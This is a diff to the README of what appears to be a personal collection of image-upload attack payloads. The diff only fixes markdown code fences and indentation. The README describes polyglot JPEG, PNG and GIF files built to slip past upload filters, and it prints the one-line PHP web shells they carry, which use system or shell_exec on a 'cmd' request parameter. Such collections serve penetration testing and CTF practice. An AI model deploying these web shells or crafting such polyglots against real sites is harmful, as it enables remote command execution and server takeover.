@@ -31,7 +31,7 @@ This directory contains my payloads and scripts related to image upload vulnerab
   A minimal, magic-byte only JPEG image. With payload.
   It contains the following PHP payload inside:
   
-  \`\`\`php
+  ```php
   <?php echo system($\_GET\['cmd']); ?>
   
 - **PLTE1.png**
@@ -40,7 +40,7 @@ This directory contains my payloads and scripts related to image upload vulnerab
   The image has an IHDR, PLTE, IDAT, and an IEND
   It contains the following PHP payload inside:
   
-  \`\`\`php
+  ```php
   <?php echo shell_exec($\_GET\['cmd']); ?>
 
 
@@ -50,7 +50,7 @@ This directory contains my payloads and scripts related to image upload vulnerab
   The image has an IHDR, tEXtComment, IDAT, and an IEND
   It contains the following PHP payload inside:
   
-  \`\`\`php
+  ```php
   <?php echo system($_GET['cmd']); ?>  
   
   
@@ -60,14 +60,14 @@ This directory contains my payloads and scripts related to image upload vulnerab
   - This wasn't tested and may not work due to unpredictable data before actual php code
   It contains the following PHP payload inside:
   
-  \`\`\`php
+  ```php
   <?php echo system($_GET['cmd']); ?> 
   
   
-  - **minimal89.gif**
-  A GIF consisting of only the GIF89a + payload
-  It contains the following PHP payload inside:
+ - **minimal89.gif**
+   A GIF consisting of only the GIF89a + payload
+   It contains the following PHP payload inside:
   
-  \`\`\`php
+  ```php
   <?php echo system($_GET['cmd']); ?> 
   
